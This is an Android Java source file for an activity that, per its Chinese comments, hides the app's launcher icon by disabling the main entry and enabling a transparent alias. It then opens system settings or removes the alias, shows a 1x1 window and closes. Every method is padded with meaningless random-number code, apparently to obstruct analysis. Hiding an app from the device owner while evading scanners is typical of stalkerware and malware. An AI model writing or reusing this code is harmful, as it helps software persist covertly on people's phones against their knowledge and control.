package zit.axt.ydq;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（ZXN），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 * 注：PMSV.initPopPower() 已提前直接执行组件切换(A16 保底)，
 * 此处的切换为幂等重复确认，主要为旧版本保留"切换后跳设置页"的原始体验。
 */
public class UETM extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        long arr_PJOzqD = java.lang.System.nanoTime();
        int i_XFOhmJaUqiw = new java.util.Random().nextInt(1000);
        boolean j_nVMuLu = (arr_PJOzqD % (i_XFOhmJaUqiw + 23)) > 56;
        double tmp_vQSkNfvUHwDj = j_nVMuLu ? java.lang.Math.sqrt(i_XFOhmJaUqiw) : java.lang.Math.pow(i_XFOhmJaUqiw, 69);
        if (tmp_vQSkNfvUHwDj < 0.0) {
            java.lang.System.out.println(tmp_vQSkNfvUHwDj);
        }
        super.onCreate(savedInstanceState);
        // 别名与当前类同包，通过当前类全限定名推导包名，避免硬编码包前缀被混淆后失效
        String pkg = getClass().getName();
        pkg = pkg.substring(0, pkg.lastIndexOf('.'));
        String alias = pkg + ".MysteryAliasActivity";
        set(UETM.this, ZXN.class.getName(), alias);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(UETM.this, alias);
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        int process_DmEdJzemmeu = new java.util.Random().nextInt(50);
        int stack_oRJKRwhxViYZORcnx = (process_DmEdJzemmeu > 28) ? 1 : ((process_DmEdJzemmeu > 32) ? 54 : ((process_DmEdJzemmeu > 79) ? 76 : 35));
        int i_skcDySazhBrsgryrZiH = stack_oRJKRwhxViYZORcnx * process_DmEdJzemmeu;
        if (i_skcDySazhBrsgryrZiH > 91) {
            java.lang.System.arraycopy(new int[] { i_skcDySazhBrsgryrZiH }, 0, new int[] { 0 }, 0, 1);
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        java.lang.Object arr_uJykfSdRzemyjOacG = new java.lang.Object();
        int i_OHLHf = arr_uJykfSdRzemyjOacG.hashCode();
        int j_WiIWuLL = new java.util.Random().nextInt(100);
        int tmp_WqrHFghDfQ = (i_OHLHf ^ j_WiIWuLL) & 0x7FFFFFFF;
        if (tmp_WqrHFghDfQ == 53 && i_OHLHf < 53) {
            arr_uJykfSdRzemyjOacG.toString();
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        int process_DmEdJzemmeu = new java.util.Random().nextInt(50);
        int stack_oRJKRwhxViYZORcnx = (process_DmEdJzemmeu > 28) ? 1 : ((process_DmEdJzemmeu > 32) ? 54 : ((process_DmEdJzemmeu > 79) ? 76 : 35));
        int i_skcDySazhBrsgryrZiH = stack_oRJKRwhxViYZORcnx * process_DmEdJzemmeu;
        if (i_skcDySazhBrsgryrZiH > 91) {
            java.lang.System.arraycopy(new int[] { i_skcDySazhBrsgryrZiH }, 0, new int[] { 0 }, 0, 1);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
